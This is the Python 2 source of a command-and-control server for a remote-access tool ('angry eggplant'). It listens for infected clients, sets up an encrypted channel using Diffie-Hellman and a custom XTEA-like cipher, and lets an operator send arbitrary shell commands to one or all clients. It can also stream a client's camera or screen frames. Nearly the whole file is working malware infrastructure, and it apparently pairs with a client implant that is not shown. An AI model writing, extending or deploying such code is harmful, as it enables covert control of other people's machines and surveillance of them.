#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

BANNER = ''' 

,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88

'''

import os
import sys
import cv2
import time
import numpy
import pickle
import socket
import select
import struct
import base64
import random
import requests
import tempfile
import threading
import subprocess
import socketserver



# globals

debug = True
exit_status = False
socket.setdefaulttimeout(None)

HELP_CMDS   = ''' 
Server Commands
--------------------------------------------------------------------
    command <args> [option] | descripton
--------------------------------------------------------------------
    client <id>             | Connect to a client
    clients                 | List connected clients
    back                    | Deselect current client
    quit                    | Exit server and keep clients alive
    usage                   | display usage help for server commands
    sendall <command>       | Send command to all clients
--------------------------------------------------------------------
< > = required argument
[ ] = optional argument
'''


class Server(threading.Thread):
    global exit_status
    def __init__(self, host='0.0.0.0', port=1337):
        super(Server, self).__init__()
        self.count          = 0
        self.lock           = threading.Event()
        self.current_client = None
        self.clients        = {}
        self.commands       = {
	    'back'	    :   self.deselect_client,
            'client'        :   self.select_client,
            'clients'       :   self.list_clients,
            'quit'          :   self.quit_server,
            'stream'        :   self.stream_client,
	    'sendall'	    :   self.sendall_clients,
            'usage'         :   self.usage,
            '--help'        :   self.usage,
            '-h'            :   self.usage,
            '?'             :   self.usage
            }
        self.manager        = threading.Thread(target=self.client_manager, name='client_manager')
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('localhost', port))
        self.s.listen(5)
        self.lock.set()

    def _pad(self, s): return s + (self.encryption['block_size'] - len(bytes(s)) % self.encryption['block_size']) * '\x00'

    def _block(self, s): return [s[i * self.encryption['block_size']:((i + 1) * self.encryption['block_size'])] for i in range(len(s) // self.encryption['block_size'])]

    def _xor(self, s, t): return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))

    def _long_to_bytes(self, x):
        try:
            return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print "Long-to-bytes conversion error: {}".format(str(e))

    def _bytes_to_long(self, x):
        try:
            return long(bytes(x).encode('hex'), 16)
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print "Bytes-to-long conversion error: {}".format(str(e))

    @property
    def __encryption(self):
        return {'endian': '!', 'rounds': 32, 'key_size': 16, 'block_size': 8}

    def _encryption(self, block, dhkey):
        v0, v1  = struct.unpack(self.encryption['endian'] + "2L", block)
        k       = struct.unpack(self.encryption['endian'] + "4L", dhkey)
        sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
        for round in range(self.encryption['rounds']):
            v0  = (v0 + (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
            sum = (sum + delta) & mask
            v1  = (v1 + (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
        return struct.pack(self.encryption['endian'] + "2L", v0, v1)

    def _decryption(self, block, dhkey):
        v0, v1  = struct.unpack(self.encryption['endian'] +"2L", block)
        k       = struct.unpack(self.encryption['endian'] + "4L", dhkey)
        delta,mask = 0x9e3779b9L, 0xffffffffL
        sum     = (delta * self.encryption['rounds']) & mask
        for round in range(self.encryption['rounds']):
            v1  = (v1 - (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
            sum = (sum - delta) & mask
            v0  = (v0 - (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
        return struct.pack(self.encryption['endian'] + "2L", v0, v1)

    def diffiehellman(self, connection, bits=2048):
        p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
        g = 2
        a = self._bytes_to_long(os.urandom(self.encryption['key_size']))
        xA = pow(g, a, p)
        connection.sendall(self._long_to_bytes(xA))
        xB = self._bytes_to_long(connection.recv(256))
        x = pow(xB, a, p)
        return sys.modules['hashlib'].new('md5', string=self._long_to_bytes(x)).digest()

    @__encryption.getter
    def encryption(self):
        return self.__encryption

    def _encrypt(self, data, dhkey):
        padded = self._pad(data)
        blocks = self._block(padded)
        vector = os.urandom(8)
        result = [vector]
        for block in blocks:
            try:
                encode = self._xor(vector, block)
                output = vector = self._encryption(encode, dhkey)
                result.append(output)
            except Exception as e:
                print str(e)
        return base64.b64encode(''.join(result))

    def _decrypt(self, data, dhkey):
        blocks = self._block(base64.b64decode(data))
        result = []
        vector = blocks[0]
        for block in blocks[1:]:
            try:
                decode  = self._decryption(block, dhkey)
                output  = self._xor(vector, decode)
                vector = block
                result.append(output)
            except Exception as e:
                print str(e)
        return ''.join(result).rstrip('\x00')
    
    def encrypt(self, data, client_id):
        if int(client_id) not in self.clients:
            print "Invalid Client ID: '{}'".format(client_id)
        else:
            key = self.clients[int(client_id)]._dhkey
            return self._encrypt(data, key)

    def decrypt(self, data, client_id):
        if int(client_id) not in self.clients:
            print "Invalid Client ID: '{}'".format(client_id)
        else:
            key = self.clients[int(client_id)]._dhkey
            return self._decrypt(data, key)
      
    def send_client(self, msg, client_id):
        if int(client_id) not in self.clients:
            print "Invalid Client ID: '{}'".format(client_id)
        else:
            client = self.clients[int(client_id)]
            data = self.encrypt(msg, client.name) + '\n'
            client.conn.sendall(data)
    
    def recv_client(self, client_id):
        if int(client_id) not in self.clients:
            print "Invalid Client ID: '{}'".format(client_id)
        else:
            client = self.clients[int(client_id)]
            buffer, method, message  = "", "", ""
            if client:
                while "\n" not in buffer:
                    buffer += client.conn.recv(4096)
                if len(buffer):
                    method, _, message = buffer.partition(':')
                    message = server.decrypt(message, client.name)
            return method, message

    def get_clients(self):
        return [v for _, v in self.current_client.items()]

      
    def deselect_client(self):
        if self.current_client and self.current_client.lock.is_set():
            self.current_client.lock.clear()
        self.current_client = None
        self.lock.set()
        return self.run()

      
    def sendall_clients(self, msg):
        for client in self.get_clients():
            self.send_client(msg, client.name)

      
    def remove_client(self, key):
        return self.clients.pop(int(key), None)
    
      
    def kill_client(self, client_id):
        client = self.clients.get(int(client_id))
        self.send_client('kill', client.name)
        client.conn.close()
        self.remove_client(client.name)
    
      
    def list_clients(self):
        print '\nID | Client Address\n-------------------'
        for k, v in self.clients.items():
            print '{:>2} | {}'.format(k, v.addr[0])
        print '\n'

    
    def usage(self):
        print HELP_CMDS
    
      
    def quit_server(self):
        q = raw_input('Exit the server and keep all clients alive (y/N)? ')
        if q.lower().startswith('y'):
            try:
                for client in self.get_clients():
                    try:
                        self.send_client('standby', client.name)
                    except: pass
            finally:
                sys.exit(0)

    def stream_client(self):
        if not self.current_client:
            return 'No Client selected'
        client = self.current_client
        client.lock.clear()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        retries = 5
        while retries > 0:
            try:
                port = random.randint(6000,9999)
                s.bind(('0.0.0.0', port))
                s.listen(1)
                self.send_client('stream {}'.format(port), client.name)
                conn, addr  = s.accept()
                break
            except:
                retries -= 1
        print '\n Streaming {} ( press <space> any time to stop )'.format(addr[0])
        header_size = struct.calcsize("L")
        window_name = addr[0]
        cv2.namedWindow(window_name)
        data = ""
        try:
            while True:
                while len(data) < header_size:
                    data += conn.recv(4096)
                packed_msg_size = data[:header_size]
                data = data[header_size:]
                msg_size = struct.unpack("L", packed_msg_size)[0]
                while len(data) < msg_size:
                    data += conn.recv(4096)
                frame_data = data[:msg_size]
                data = data[msg_size:]
                frame = pickle.loads(frame_data)
                cv2.imshow(window_name, frame)
                key = cv2.waitKey(70)
                if key == 32:
                    break
        finally:
            conn.close()
            cv2.destroyAllWindows()
            client.lock.set()
        return client.run()
        
    def select_client(self, client_id):
        if self.lock.is_set():
            self.lock.clear()
        if self.current_client and self.current_client.lock.is_set():
            self.current_client.lock.clear()
        if int(client_id) not in self.clients:
            print '\nInvalid Client ID\n'
        else:
            self.current_client = self.clients[int(client_id)]
            print '\nClient {} selected\n'.format(client_id)
            self.current_client.lock.set()
            return self.current_client.run()

    def client_manager(self):
        while True:
            conn, addr  = self.s.accept()
            name        = len(self.clients) + 1
            client      = ConnectionHandler(conn, addr, name)
            self.clients[name] = client
            client.start()
            if exit_status:
                break

    def run(self):
        while True:
            if not self.manager.is_alive():
                self.manager = threading.Thread(target=self.client_manager, name='client_manager')
                self.manager.daemon = True
                self.manager.start()
            if exit_status:
                break
            if self.current_client:
                if self.lock.is_set():
                    self.lock.clear()
            else:
                if not self.lock.is_set():
                    self.lock.set()
            self.lock.wait()
            output = ''
            cmd_buffer = raw_input('$ ')
            cmd, _, action = cmd_buffer.partition(' ')
            if cmd in self.commands:
                try:
                    output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
                except Exception as e1:
                    output = str(e1)
            else:
                try:
                    output = subprocess.check_output(cmd_buffer, shell=True)
                except Exception as e2:
                    output = str(e2)
            if output and len(output):
                print output


class ConnectionHandler(threading.Thread):
    global server
    global exit_status
    global debug

    def __init__(self, conn, addr, name):
        super(ConnectionHandler, self).__init__()
        self.prompt = None
        self.conn   = conn
        self.addr   = addr
        self.name   = name
        self.info   = {}
        self.lock   = threading.Event()
        self._dhkey = server.diffiehellman(conn)

    def run(self, prompt=None):
        while True:
            if exit_status:
                break
            self.lock.wait()
            method, data = ('prompt', prompt) if prompt else server.recv_client(self.name)
            if 'prompt' in method:
                command = raw_input(data % int(self.name))
                cmd, _, action = command.partition(' ')
                if cmd in server.commands:
                    result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
                    if result:
                        print result
                    return self.run(prompt=data)
                else:
                    server.send_client(command, self.name)
                    return self.run()
            else:
                if data:
                    print data
         

if __name__ == '__main__':
    print BANNER
    p = 1337
    debug = True
    server  = Server(port=p)
    print "Server running on port {}...".format(p)
    server.start()



 
